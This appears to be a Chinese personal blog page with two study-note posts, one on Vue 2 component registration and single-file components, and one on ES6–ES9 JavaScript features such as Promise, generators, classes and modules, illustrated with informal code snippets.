<p>创建vm（局部注册组件）<br>new Vue({<br>el:’#root’,<br>components:{<br>rain， 这里的rain如果是一个对象，如果本身没有调用，会默认调用Vue.extend方法<br>shine,<br>这里如果出现多个单词的  如’my-school’:s   写的时候&lt; my-school&gt;&lt; &#x2F;my-school&gt; 页面最后呈现是<br>&lt; MySchool&gt;<br>也可以<br>MySchool:s  写的时候 &lt; MySchool&gt;&lt; &#x2F;MySchool&gt;（这种只有在脚手架中才可以）<br>}</p>
<p>})</p>
<p>全局注册组件：<br>Vue.component(‘rain’,rain) 组件名  组件</p>
<p>写入组件</p>
<p>&lt; div id&#x3D;’root’&gt;&lt; rain&gt;&lt; &#x2F;rain&gt;&lt; &#x2F;div&gt;<br>也可以<br>&lt; div id&#x3D;’root’&gt;&lt; rain&#x2F;&gt; 自闭和的形式 但也得在脚手架环境下 （如果不是，也不会报错，但不能复用）才可以复用&lt; &#x2F;div&gt;</p>
<h4 id="组件的嵌套"><a href="#组件的嵌套" class="headerlink" title="组件的嵌套:"></a>组件的嵌套:</h4><p>const shine&#x3D;….</p>
<p>const rain&#x3D;Vue.extend({<br>template:<code>&lt; div&gt;....&lt; shine&gt;&lt; /shine&gt; &lt; /div&gt;</code><br>data(){<br>return {<br>schoolName:’’,<br>…<br>},<br>components:{<br>shine<br>}<br>}</p>
<p>new Vue({<br>el:’#root’,<br>components:{<br>rain，</p>
<p>}</p>
<h4 id="VueComponent构造函数"><a href="#VueComponent构造函数" class="headerlink" title="VueComponent构造函数:"></a>VueComponent构造函数:</h4><p>如:前面  const rain&#x3D;Vue.extend({…})<br>这里的rain本身是 f VueComponent(options){this._init(options)}</p>
<p>总结:<br>1 rain组件本质是一个名为VueComponent的构造函数,且不是程序员定义的，是Vue.extend生成的<br>2 只要写&lt; rain&#x2F;&gt;或者 &lt; rain&gt;&lt; &#x2F;rain&gt;，Vue解析时会帮我们创建rain组件的实例对象,即Vue帮我们执行了:new VueComponent(options)<br>3 每次调用Vue.extend,返回的都是一个全新的VueComponent<br>4<br>组件配置中:<br>data函数,methods函数,watch中的函数，computed中的函数,他们的this均是VueComponent实例对象</p>
<p>new Vue(options)配置中:data函数,methods中的函数,watch中的函数，compputed中的函数，它们的this均是Vue实例对象</p>
<p>5 VueComponent实例对象以后简称 vc<br>  Vue的实例对象 简称vm</p>
<h4 id="一个重要的内置关系"><a href="#一个重要的内置关系" class="headerlink" title="一个重要的内置关系:"></a>一个重要的内置关系:</h4><p>VueComponent(这里得写组件实例名).prototype.<strong>proto</strong>&#x3D;&#x3D;&#x3D;Vue.prototype  true</p>
<p>可以让组件实例对象(vc)访问到Vue原型链上的属性，方法</p>
<h4 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件:"></a>单文件组件:</h4><p>标签的高亮效果: vscode应用商店 里Vetur插件<br>如 rain.vue<br>快捷键:&lt;v +回车<br>&lt; template&gt;&lt; &#x2F;template&gt;<br>&lt; script&gt;<br>export default{ 这里的default后面省略Vue.extend</p>
<p>}&lt; &#x2F;script&gt;<br>&lt; style&gt;&lt; &#x2F;style&gt;</p>
<p>准备一个容器<br>index.html<br>&lt; div id&#x3D;’root’&gt;<br>&lt; App&gt;&lt; &#x2F;App&gt;&lt; &#x2F;div&gt;<br>&lt; script  src&#x3D;’…vue.js’&gt;&lt; &#x2F;script&gt;<br>&lt; script  src&#x3D;’…main.js’&gt;&lt; &#x2F;script&gt; </p>
<p>main.js: 入口文件<br>import App from ‘.&#x2F;App.vue’  于是来到    App.vue<br>new Vue({<br>el:’#root’,<br>如果上面不写 可以在这里  template:<code>&lt; App&gt;&lt; /App&gt;</code>,<br>components:{App}<br>})</p>
<p>App.vue 这里汇总所有组件<br>&lt; template&gt;<br>&lt; div&gt;…&lt; &#x2F;div&gt;<br>&lt; &#x2F;template&gt;</p>
<p>&lt; script&gt;</p>
<p>&lt; &#x2F;script&gt;<br>….</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/25/vue2-0-3-0/" data-id="cl1dgisuh0006ngnobw1k05gt" data-title="vue2.0+3.0" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ES6-11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/03/22/ES6-11/" class="article-date">
  <time class="dt-published" datetime="2022-03-22T06:15:40.000Z" itemprop="datePublished">2022-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/03/22/ES6-11/">ES6-11</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>javaScript基本语法 即es5的相关语法</p>
<h4 id="let变量声明及声明特性"><a href="#let变量声明及声明特性" class="headerlink" title="let变量声明及声明特性:"></a>let变量声明及声明特性:</h4><p>1 变量不能重复声明<br>如 let a&#x3D;1;<br>let a&#x3D;2; 报错</p>
<p>2 块级作用域</p>
<p>在{}里面有效，出了这个区域就会无效(而在javascript中没有这个作用域，只会有 函数作用域 全局作用域 eval作用域 eval作用域只会出现在严格模式下)</p>
<p>在if else while for里面 如果用let 声明 也会出现块级作用域</p>
<p>3 不存在变量提升</p>
<p>4 不影响作用域链(由内到外查找)</p>
<h4 id="const声明常量及其特点"><a href="#const声明常量及其特点" class="headerlink" title="const声明常量及其特点:"></a>const声明常量及其特点:</h4><p>常量:值不能修改的量<br>一般常量使用大写</p>
<p>1 一定要赋初始值</p>
<p>2 常量的值不能修改</p>
<p>3 块级作用域</p>
<p>4 对于数组和对象的元素修改  不算作对常量的修改,不会报错<br>如  const arr&#x3D;[];<br>arr.push(1)<br>虽然arr的元素发生变化，但arr所指向的地址值没有发生变化<br>但如果 arr&#x3D;10 则会报错 因为原来的地址值变化了</p>
<h4 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值:"></a>变量的解构赋值:</h4><p>1 数组的解构<br>const f4&#x3D;[‘老王’,’老张’,’老李’,’老桃’];<br>let（var） [wang,zhang,li,tao]&#x3D;f4;<br>wang 的值为 ‘老王’<br>…</p>
<p>2 对象的解构</p>
<p>const shan&#x3D;{<br>name：’隔壁老王’,<br>age:’不详’,<br>dance:function（）{}<br>}</p>
<p>let  {name,age,dance}&#x3D;shan;</p>
<p>name为隔壁老王<br>…</p>
<h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串:"></a>模板字符串:</h4><p>&#96;&#96;反引号<br>let str&#x3D;<code>你是谐星吗</code></p>
<p>1 内容中可以出现换行</p>
<p>2 变量拼接</p>
<p>let a&#x3D;<code>$&#123;str&#125;是的</code></p>
<h4 id="对象的简化写法"><a href="#对象的简化写法" class="headerlink" title="对象的简化写法:"></a>对象的简化写法:</h4><p>如:<br>let name&#x3D;’老王’;<br>let change&#x3D;function(){}</p>
<p>const school&#x3D;{<br>name,change<br>} 这种写法等价于<br>const school&#x3D;{<br>name:name,<br>change：change<br>}</p>
<p>还有 声明的简化<br>const school&#x3D;{<br>name:name,<br>change：change，<br>improve:function(){}<br>}可以简化成<br>const school&#x3D;{<br>name:name,<br>change：change，<br>improve(){}<br>}</p>
<h4 id="箭头函数及其声明特点"><a href="#箭头函数及其声明特点" class="headerlink" title="箭头函数及其声明特点:"></a>箭头函数及其声明特点:</h4><p>原来<br>let fn&#x3D;function(){}</p>
<p>现在 let fn&#x3D;(a,b)&#x3D;&gt;{<br>return a+b;<br>}</p>
<p>1 箭头函数中this是静态的 始终指向函数声明时所在作用域下的this的值<br> 无法 通过call,apply等方式去改变this的值 （本身是没有this的，所以会自动往外找）</p>
<p>2 不能作为构造函数来实例化对象</p>
<p>3 箭头函数中不能使用arguments变量</p>
<p>4 箭头函数的简写</p>
<ol>
<li><p>省略小括号 当形参有且只有一个的时候<br>let add&#x3D; (n)&#x3D;&gt;{<br>return n+n;<br>}<br>可直接简化成<br>let add&#x3D; n&#x3D;&gt;{<br>return n+n;<br>}</p>
</li>
<li><p>省略花括号 当代码体只有一条语句的时候,此时return 也必须省略 而且语句的执行结果就是函数的返回值</p>
</li>
</ol>
<p>let add&#x3D; n&#x3D;&gt;{<br>return n+n;<br>} 简化成<br>let add&#x3D; n&#x3D;&gt;n+n;</p>
<p>应用场景</p>
<p>btn.onclick&#x3D;function(){<br>setTimeout(function(){<br>console.log(this)  这里的this是 window<br>},3000)<br>}</p>
<p>btn.onclick&#x3D;function(){<br>setTimeout(()&#x3D;&gt;{<br>console.log(this)  换成箭头函数后这里的this是 btn元素<br>},3000)<br>}</p>
<h4 id="es6允许给函数参数赋值初始值"><a href="#es6允许给函数参数赋值初始值" class="headerlink" title="es6允许给函数参数赋值初始值:"></a>es6允许给函数参数赋值初始值:</h4><p>1 具有默认值的参数一般放在最后(放其他位置也不会有错，但没有意义)<br>function add(a,b,c&#x3D;10){<br>return a+b+c;<br>}</p>
<p>2 与解构赋值结合<br>function connnect({name,host&#x3D;’127.0.0.1’}){ 如果没有传 走默认值</p>
<p>console.log(name)<br>}</p>
<p>connect({<br>host:’localhost’<br>…<br>})</p>
<h4 id="rest参数"><a href="#rest参数" class="headerlink" title="rest参数:"></a>rest参数:</h4><p>rest参数必须放在最后<br>function (…args){}  args为一个数组</p>
<p>与arguments不同的是</p>
<p>args的原型是一个数组，可以用数组的方法<br>而arguments的原型是一个对象，不能用数组的方法</p>
<h4 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符:"></a>扩展运算符:</h4><p>1 能将数组转换成 以逗号 分隔开的参数序列</p>
<p>2 数组的合并</p>
<p>var arr1&#x3D;[1,2];<br>var arr2&#x3D;[3,4];</p>
<p>var arr3&#x3D;[…arr1,…arr2];[1,2,3,4]</p>
<p>3 数组的克隆(如果里面有引用类型，就是浅拷贝)<br>var sanzhihua&#x3D;[‘a’,’b’,’c’];<br>var yiduohua&#x3D;[…sanzhihua];</p>
<p>4 将伪数组转化为真正的数组<br>var divs&#x3D;document.querySelectorAll(‘div’)  NodeList伪数组对象</p>
<p>var arr&#x3D;[…divs]</p>
<p>还可以将多个对象的属性和属性值合并到一个对象里：<br>var obj1&#x3D;{name:1}  var obj2&#x3D;{city:2}  var obj3&#x3D;{action:3}</p>
<p>var obj4&#x3D;{…obj1,…obj2,…obj3}</p>
<h4 id="Symbol的介绍与创建"><a href="#Symbol的介绍与创建" class="headerlink" title="Symbol的介绍与创建:"></a>Symbol的介绍与创建:</h4><p>一种新的数据类型</p>
<p>1 Symbol的值是惟一的，可以解决命名冲突的问题</p>
<p>2 Symbol的值不能与其他数据进行运算</p>
<p>3 Symbol定义的对象属性不能使用for… in 循环遍历，但可以使用Reflect.ownKeys来获取对象的所有键名</p>
<p>创建Symbol<br>let s&#x3D;Symbol() 当成函数</p>
<p>let s2&#x3D;Symbol(‘尚硅谷’);</p>
<p>let s3&#x3D;Symbol(‘尚硅谷’);</p>
<p>s2不等于s3<br>Symbol.for（） 创建  当成对象</p>
<p>let s4&#x3D;Symbol.for(‘尚硅谷’)<br>let s5&#x3D;Symbol.for(‘尚硅谷’)</p>
<p>s4与s5相等</p>
<p>使用场景<br>给对象添加属性或者方法</p>
<p>let youxi&#x3D;{<br>[Symbol(‘say’)]:function(){},<br>[Symbol(‘dance’)]:function(){}<br>}</p>
<h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器:"></a>迭代器:</h4><p>iterator 是一种接口<br>任何一种数据结构只要部署了这样一个接口，就可以完成遍历操作<br>是对象中的一种属性 Symbol（Symbol.iterator）</p>
<ol>
<li>es6创建了一种新的遍历命令for…of循环，iterator接口主要供for..of消费</li>
</ol>
<p>2） 具备itrator接口的数据<br>Array<br>arguments<br>Set<br>Map<br>String<br>NodeList</p>
<p>工作原理:<br>创建一个指针对象(由Symbol.iterator这个对象的函数创建一个对象),指向当前数据结构的起始位置<br>第一次调用next方法,指针自动指向数据结构的第一个成员<br>接下来不断调用next方法,指针一直往后移动，直到指向最后一个成员<br>每次调用Next方法返回一个包含value和done属性的对象</p>
<p>const xiyou&#x3D;[‘猴’，’猪’,’打工人’,’光头’]</p>
<p>let iterator&#x3D;xiyou[Symbol.iterator]( ）</p>
<p>调用对象的next方法</p>
<p>console.log(iterator.next());{value：’猴’,done:true}<br>console.log(iterator.next());{value：’猪’,done:true}<br>console.log(iterator.next());{value：’打工人’,done:true}<br>console.log(iterator.next());{value：’光头’,done:true}<br>console.log(iterator.next());{value:undefined,done:false}</p>
<p>需要自定义遍历数据的时候，使用迭代器</p>
<p>如 想要对一个对象使用for…of遍历<br> var obj&#x3D;{name:’老王’,stus:[1,2,3]};<br>因为里面没有迭代器，所以无法用for…of遍历</p>
<p> var obj&#x3D;{<br>name:’老王’,<br>stus:[1,2,3],<br>[Symbol.iterator](）{</p>
<p>return {<br>var that&#x3D;this;<br>var index&#x3D;0;<br>next:function(){<br>if(index&lt;that.stus.length){<br>var result&#x3D; {value:that.stus[i],done:false};<br>i++;<br>return result;<br>}<br>else{<br>return {value:undefined,done:true}<br>}<br>}</p>
<p>}</p>
<p>}<br>};</p>
<p>for(var i in of){<br>console.log(v)<br>}</p>
<p>1<br>2<br>3</p>
<h4 id="生成器函数声明与调用"><a href="#生成器函数声明与调用" class="headerlink" title="生成器函数声明与调用:"></a>生成器函数声明与调用:</h4><p>function * gen（）{</p>
<p>console.log(‘hello generator’);<br>}</p>
<p>let iterator&#x3D;gen();<br>iterator.next(); 这里才执行了上面的函数</p>
<p>生成器函数可以出席那yield语句(函数代码的分隔符)</p>
<p>function * gen（）{<br>console.log(111);<br>yield ‘1’;<br>console.log(222);<br>yield ‘2’;<br>console.log(333);<br>yield ‘3’;</p>
<p>}</p>
<p>let iterator&#x3D;gen();<br>iterator.next();111<br>iterator.next();222<br>iterator.next();333</p>
<p>function * gen（）{</p>
<p>yield ‘1’;</p>
<p>yield ‘2’;</p>
<p>yield ‘3’;</p>
<p>}</p>
<p>console.log（iterator.next());1<br>console.log（iterator.next());2<br>console.log（iterator.next());3</p>
<p>for（var i of gen）{<br>console.log(i)<br>}<br>1  每次迭代是yield后面的内容<br>2<br>3</p>
<h4 id="生成器函数的参数传递"><a href="#生成器函数的参数传递" class="headerlink" title="生成器函数的参数传递:"></a>生成器函数的参数传递:</h4><p>异步编程</p>
<p>function * gen(…args){<br>console.log(args);<br>let one&#x3D;yield ‘1’;<br>console.log(one);<br>yield ‘2’;<br>yield ‘3’;</p>
<p>}</p>
<p>let iterator&#x3D;gen();<br>iterator.next();111</p>
<p>next方法可以传入实参，而这个实参就是整个yield语句的返回结果</p>
<p>第二次调用Next方法传入的实参将作为第一次yield语句的返回结果</p>
<p>iterator.next(‘AAA’);AAA 222 </p>
<p>第三次调用Next方法传入的实参将作为第二次yield语句的返回结果<br>iterator.next();333</p>
<p>生成器函数实例:<br>function one(){<br>setTimeout(function(){<br>console.log(111)</p>
<p>iterator.next(); 解决了回调地狱的问题(回调里面一层套一层)<br>},1000)<br>}</p>
<p>function two(){<br>setTimeout(function(){<br>console.log(222)<br>iterator.next();<br>},2000)<br>}</p>
<p>function three(){<br>setTimeout(function(){<br>console.log(333)<br>},3000)<br>}</p>
<p>function * time(){<br>yield one();<br>yield two();<br>yield three();<br>}</p>
<p>var itertor&#x3D;time();<br>iterator.next();  111 222 333</p>
<h4 id="Promise的介绍与基本使用"><a href="#Promise的介绍与基本使用" class="headerlink" title="Promise的介绍与基本使用:"></a>Promise的介绍与基本使用:</h4><p>实例化promise对象<br>有三个状态 初始化 成功 失败<br>const p&#x3D;new Promise(function(resolve,reject){<br>setTimeout(function(){<br>let data&#x3D;’数据库中的用户数据’;<br>resolve(data);  执行resolve函数后,promise的状态会变成成功</p>
<p>let err&#x3D;’读取失败’;<br>resolve(err);<br>},1000)</p>
<p>})</p>
<p>如果成功后，可以调用then方法<br>如果前面调用了resolve方法，那么就会执行then里面的第一个回调函数<br>如果前面调用了reject方法，那么就会执行then里面的第二个回调函数<br>p.then(function(value){ 这里的value就是resolve函数的实参 </p>
<p>},function(reason){这里的reason就是reject函数的实参</p>
<p>})</p>
<h4 id="promise封装读取文件"><a href="#promise封装读取文件" class="headerlink" title="promise封装读取文件:"></a>promise封装读取文件:</h4><p>读取文件.js<br>const fs&#x3D;require(‘fs’);</p>
<p>调用方法读取文件<br>fs.readFile(‘..&#x2F;… .md’,(err,data)&#x3D;&gt;{<br>if（err）{throw err} 如果失败，抛出错误<br>console.log(data.toString());如果成功，输出结果<br>})</p>
<p>把上面的换成promise封装（如果有多个，那么上面的代码会不停往里面缩进，而promise不会）<br>const p&#x3D;new Promise(function(resolve,reject){<br>fs.readFile(‘..&#x2F;….md’,(err.data)&#x3D;&gt;{<br>if（err）{reject(err)}<br>如果成功  resolve(data);<br>})</p>
<p>})</p>
<p>p.then(function(value){</p>
<p>},function（reason）{</p>
<p>})</p>
<h4 id="使用promise封装ajax"><a href="#使用promise封装ajax" class="headerlink" title="使用promise封装ajax:"></a>使用promise封装ajax:</h4><p>const xhr&#x3D;new XMLHttpRequest()</p>
<p>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)</p>
<p>xhr.send();</p>
<p>xhr.onreadystatechange&#x3D;function(){<br>if(xhr.readyState&#x3D;&#x3D;4){<br>if(xhr.status&#x3D;&#x3D;200&amp;&amp;xhr.status&lt;300){}</p>
<p>下面用promise对上面代码封装:<br>const p&#x3D;new Promise((resolve,reject)&#x3D;&gt;{</p>
<p>const xhr&#x3D;new XMLHttpRequest()</p>
<p>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)</p>
<p>xhr.send();</p>
<p>xhr.onreadystatechange&#x3D;function(){<br>if(xhr.readyState&#x3D;&#x3D;4){<br>if(xhr.status&#x3D;&#x3D;200&amp;&amp;xhr.status&lt;300){<br>resolve(xhr.response)}<br>else<br>{<br>reject(xhr.status)<br>}</p>
<p>})</p>
<p>p.then(function(value){},function(reason){})</p>
<h4 id="关于promise的then方法"><a href="#关于promise的then方法" class="headerlink" title="关于promise的then方法:"></a>关于promise的then方法:</h4><p>then方法的返回结果也是一个promise</p>
<p>如果回调函数中返回的结果是非promise类型的属性，状态为成功,返回值为对象成功的值<br>如果没有写返回结果，默认返回undefined<br>const result&#x3D;p.then(function(value){<br>return 1},function(reason){})</p>
<p>这里result的值 promiseValue为123 promiseStatus为:resolved</p>
<p>如果回调函数中返回的结果是promise类型的属性，状态为成功,返回值为对象成功的值<br>const result&#x3D;p.then(function(value){<br>return </p>
<p>new Promise((resolve,reject)&#x3D;&gt;{<br>resolve(‘ok’)<br>})     这里promise的状态就决定了then方法的返回结果的状态，这里成功的值就是thenn方法返回结果的值<br>},function(reason){})</p>
<p>如果抛出错误,结果为rejected<br>const result&#x3D;p.then(function(value){<br>throw ‘出错了’<br>},function(reason){})</p>
<p>因为then方法可以返回一个promise对象，所以可以链式调用<br>链式调用(解决回调地狱)<br>使用场景:先有，然后才有,最后才有.</p>
<p>p.then(value&#x3D;&gt;{},reason&#x3D;&gt;{} 这里第二个错误的回调也可以不写).then(value&#x3D;&gt;{</p>
<p>})</p>
<h4 id="promise对象的catch方法"><a href="#promise对象的catch方法" class="headerlink" title="promise对象的catch方法:"></a>promise对象的catch方法:</h4><p>const p&#x3D;new Promise(function(resolve,reject){<br>reject(‘出错了’)<br>}</p>
<p>下面两种都可以<br>p.then(function(){},function(reason){<br>console.log(reason);})</p>
<p>p.catch(function(reason){<br>console.log（reason）</p>
<p>})</p>
<h4 id="Set："><a href="#Set：" class="headerlink" title="Set："></a>Set：</h4><p>Set（集合）<br>类似数组<br>成员的值都是唯一的<br>集合实现了iterator接口，所以可以使用扩展运算符展开和for..of进行遍历</p>
<p>属性和方法:<br>const s&#x3D;new Set（[1,2,3,4]）<br>类型为 ‘object’</p>
<p>个数: s.size</p>
<p>添加元素:s.add(‘111’)</p>
<p>删除元素:s.delete(3)</p>
<p>检测: s.has(3) 有 返回true,否则返回false</p>
<p>清空: s2.clear()</p>
<p>可用于数组去重:<br>[…new Set(arr)]</p>
<h4 id="Map："><a href="#Map：" class="headerlink" title="Map："></a>Map：</h4><p>类似对象（就是升级版的对象），也是键值对的集合<br>但是键的范围不限于字符串，各种类型的值(包括对象)都可以当作键<br>map也实现了iterator接口</p>
<p>let m&#x3D;new Map();</p>
<p>添加元素:m.set(‘name’,’尚硅谷’)<br>m.set(‘change’,function(){})</p>
<p>let key&#x3D;{school:’atguigu’};<br>m.set(key,[‘北京’,’上海’,’广州’]); 这里是对象作为键名</p>
<p>个数:m.size<br>删除:m.delete(‘name’)<br>获取:m.get(‘change’)<br>清空:m.clear();</p>
<h4 id="class的介绍："><a href="#class的介绍：" class="headerlink" title="class的介绍："></a>class的介绍：</h4><p>class Phone{</p>
<p>构造方法 名字不能修改<br>constructor(a,b){当出席那new Phone()时该构造函数就会执行<br>this.a&#x3D;a;<br>this.b&#x3D;b;<br>}</p>
<p>方法必须使用该语法,不能使用es5的对象完整形式<br>call(){</p>
<p>}<br>}</p>
<p>var m&#x3D;new Phone(‘1’,2)</p>
<p>上面换成es5的写法:<br>function Phone(a,b){<br>this.a&#x3D;a;<br>this.b&#x3D;b;</p>
<p>}</p>
<p>Phone.prototype.call&#x3D;function（）{}</p>
<p>var m&#x3D;new Phone();</p>
<h4 id="class的静态成员"><a href="#class的静态成员" class="headerlink" title="class的静态成员:"></a>class的静态成员:</h4><p>es5的写法:<br>function Phone(){}</p>
<p>Phone.name&#x3D;’1’; 函数也是一个对象<br>Phone.change&#x3D;function(){};</p>
<p>let a&#x3D; new Phone();<br>a.name;undefined<br>a.change;报错</p>
<p>实例和构造函数对象是不相通的<br>实例是和构造函数对象的原型是相通的</p>
<p>如果 Phone.name&#x3D;’1’ 写成  Phone.prototype.name&#x3D;’1’ 则实例也能拿到</p>
<p>属于函数对象，而不属于实例的成员 称为 静态成员</p>
<p>上面换成es6写法后</p>
<p>class Phone{<br>static name&#x3D;1  静态成员<br>static change(){}<br>}</p>
<p>var a&#x3D;new Phone()<br>a.name ：undefined<br>Phone.name :1</p>
<h4 id="class的继承"><a href="#class的继承" class="headerlink" title="class的继承:"></a>class的继承:</h4><p>class Phone{<br>constructor(a,b){<br>this.a&#x3D;a;<br>this.b&#x3D;b;<br>}<br>call(){}<br>}</p>
<p>class SmartPhone extends Phone{<br>constructor（a,b,c,d）{<br>super(a,b)调用父类方法  相当于es5中的 Phone.call(this,a,b);<br>this.color&#x3D;color;<br>this.size&#x3D;size;<br>}</p>
<p>photo(){}<br>}</p>
<p>const a&#x3D;new SmartPhone(1,2,3,4);<br>父类方法也可以调用</p>
<h4 id="子类对父类方法的重写"><a href="#子类对父类方法的重写" class="headerlink" title="子类对父类方法的重写:"></a>子类对父类方法的重写:</h4><p>可以在字类声明一个和父类重名的方法</p>
<p>后面子类实例调用这个重名方法时，是子类的，父类中的同名方法，字类实例是无法调用的</p>
<h4 id="getter与setter："><a href="#getter与setter：" class="headerlink" title="getter与setter："></a>getter与setter：</h4><p>当获取某个属性时执行get函数<br>当对某个属性进行设置时执行set函数</p>
<p>class Phone{<br>get  price(){<br>console.log(‘1’)<br>return 11  这里的返回值就是  s.price的返回值<br>}</p>
<p>set Price(value){}</p>
<p>}</p>
<p>let s&#x3D;new Phone();<br>console.log(s.price) 1  11<br>s.price&#x3D;2;</p>
<h4 id="数值扩展"><a href="#数值扩展" class="headerlink" title="数值扩展:"></a>数值扩展:</h4><p>Number.EPSILON是javaScript表示的最小精度:<br>function equal(a,b){<br>if（Math.abs(a-b)&lt;Number.EPSILON）{<br>return true;<br>}else{return false;}<br>}</p>
<p>console.log(equal(0.1+0.2,0.3))</p>
<p>Number.isFinite()检测一个数是否为有限数:<br>Number.isFinite(1): true<br>Number.isFinite(100&#x2F;0): false<br>Number.isFinite(Infinity): false</p>
<p>Number.isNaN()检测一个数值是否是NaN：<br>Number.isNaN(123) false</p>
<p>Number.isInteger()判断一个数是否是整数：<br>Number.isInteger(1)  true<br>Number.isInteger(2.5)  false</p>
<p>Math.trunc()将一个数的小数部分去掉<br>Math.trunc(3.5)  3</p>
<p>Math.sign（） 检测一个数是否是正数 0 负数</p>
<p>Math.sign（100） 1<br>Math.sign（0） 0<br>Math.sign（-100） -1</p>
<h4 id="对象方法的扩展"><a href="#对象方法的扩展" class="headerlink" title="对象方法的扩展:"></a>对象方法的扩展:</h4><p>Object.is()  判断两个值是否完全相等(&#x3D;&#x3D;&#x3D;) </p>
<p>Object.is(100,100)  true</p>
<p>特殊情况:<br>Object.is(NaN,NaN)  true</p>
<p>Object.assign（obj1,obj2）:对象的合并<br>如果出现属性重名 ，后面会覆盖前面的，如果前面对象出现 后面对象属性中没有的 则会被保留下来</p>
<p>Object.setPrototypeOf（）  改变一个对象的原型对象<br>const school&#x3D;{};<br>const cities&#x3D;{};<br>Object.setPrototypeOf(school,cities); 把school的原型对象改成了cities对象</p>
<p>Object.getPrototypeOf  获取一个对象的原型对象<br>Object.setPrototypeOf（school） 为cities</p>
<h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化:"></a>模块化:</h4><p>优势:<br>防止命名冲突<br>代码复用<br>高维护性(产品升级需要做改动时，只需改一部分文件)</p>
<p>语法:<br>import  输入其他模块的功能<br>export 规定模块的对外接口</p>
<p>如:<br>1.html中</p>
<script type='module'>
import * as m1 from '../1.js' 也可以用解构赋值的形式  import {m,fun} from '../1.js' 
console.log(m1)
</script>

<p>1.js:<br>export let m&#x3D;10;<br>export function fun(){}</p>
<p>也可以<br>let m&#x3D;10;<br>function fun(){}<br>export {m,fun}</p>
<p>还可以<br>export default{<br>m:10,<br>fun:function(){}</p>
<p>}</p>
<p>第3种调用时   m1.default.fun()</p>
<p>当不同的js模块被引入到同一个文件中时，并且变量名出现重名，可以使用别名<br>  import {m as guigu,fun} from ‘..&#x2F;1.js’</p>
<p>导入时 如果是默认暴露 使用结构赋值形式<br>import {default as m3} from ‘..&#x2F;1.js’</p>
<p>简便形式 针对默认暴露:<br>import m3 from ‘..&#x2F;1.js’</p>
<p>模块化 还可以 把上面3个js文件导入到一个新的文件4.js中<br>然后在html页面中</p>
<script src='./4.js' type='module'></script>




<h4 id="babel对es6模块化代码转换"><a href="#babel对es6模块化代码转换" class="headerlink" title="babel对es6模块化代码转换:"></a>babel对es6模块化代码转换:</h4><p>npm init –yes<br>npm i babel-cli babel-preset-env browserify -D(开发依赖)</p>
<p>如果这里是局部安装  npx babel  src&#x2F;js（文件路径）  -d（要存到哪里） dist&#x2F;js –presets&#x3D;babel-preset-env  </p>
<p>如果是全局安装  babel …</p>
<p>(代码依然无法在浏览器中运行)还需要打包<br>npx browserify dist&#x2F;js&#x2F;app.js -o dist&#x2F;bundle.js</p>
<h4 id="es6模块化引入npm包"><a href="#es6模块化引入npm包" class="headerlink" title="es6模块化引入npm包:"></a>es6模块化引入npm包:</h4><p>npm i jquery</p>
<p>import $ from ‘jquery’<br>$(‘body’).css(‘background’,pink)</p>
<h4 id="es7新特性-includes-和"><a href="#es7新特性-includes-和" class="headerlink" title="es7新特性 includes 和 **:"></a>es7新特性 includes 和 **:</h4><p>var arr&#x3D;[1,2]</p>
<p>arr.includes(3) false</p>
<p>2的10次方<br>2 ** 10    1024 与Math.pow(2,10) 效果一样</p>
<h4 id="es8新特性-async-和-await"><a href="#es8新特性-async-和-await" class="headerlink" title="es8新特性 async 和 await:"></a>es8新特性 async 和 await:</h4><p>async:<br>async函数的返回值为promise对象(即便里面写的是return 1)</p>
<p>如果返回的结果不是一个promise对象，返回的结果就是成功的Promise对象<br>如果里面抛出错误（throw new Error(‘出错了’)），则返回一个失败状态的promise</p>
<p>返回的结果如果是一个promise对象，resolve或者reject里面的结果就是函数的结果，函数的状态与这里的promise对象状态一样</p>
<p>await:<br>await必须放在async函数里面 （但是async里面可以没有await）<br>await右侧的表达式一般是promise对象<br>await返回的是promise成功的值<br>await的promise失败了,就会抛出异常,需要通过try..catch捕获处理</p>
<p>try{<br>let result&#x3D;await p;</p>
<p>}catch(e){}</p>
<h4 id="es8对象方法扩展"><a href="#es8对象方法扩展" class="headerlink" title="es8对象方法扩展:"></a>es8对象方法扩展:</h4><p>const s&#x3D;{name:’1’,xueke:’2’};<br>获取对象所有的键名: Object.keys(s);<br>获取对象所有的值:Object.values(s);</p>
<p>Object.entries(school); 结果:一个数组每个元素都是键值对的形式 可以用来创建map<br>new Map(Object.entries(school))</p>
<p>Object.getOwnPropertyDescriptors(school)  对象属性的描述对象<br>也是一个对象，但属性值中还有 writable,enumerable,…</p>
<p>(<br>属性特性:<br>writable :是否可写<br>configurable:是否可删除<br>enumerable:是否可枚举</p>
<p>对象的克隆<br>const obj&#x3D;Object.create(null 原型对象,{<br>name：’尚硅谷’,<br>writable:true,<br>configurable:true,<br>enumerable：false<br>})</p>
<p>)</p>
<h4 id="es9正则扩展-命名捕获分组"><a href="#es9正则扩展-命名捕获分组" class="headerlink" title="es9正则扩展:命名捕获分组:"></a>es9正则扩展:命名捕获分组:</h4><p>举例:<br>let str&#x3D;’<a target="_blank" rel="noopener" href="http://www.atguigu.com">尚硅谷</a>‘<br>提取url和文本<br>用es5的写法是</p>
<p>const reg&#x3D;&#x2F;<a href="(.*)">(.*)</a>&#x2F;<br>const result&#x3D;reg.exec(str);</p>
<p>url：result[1];<br>文本:result[2];</p>
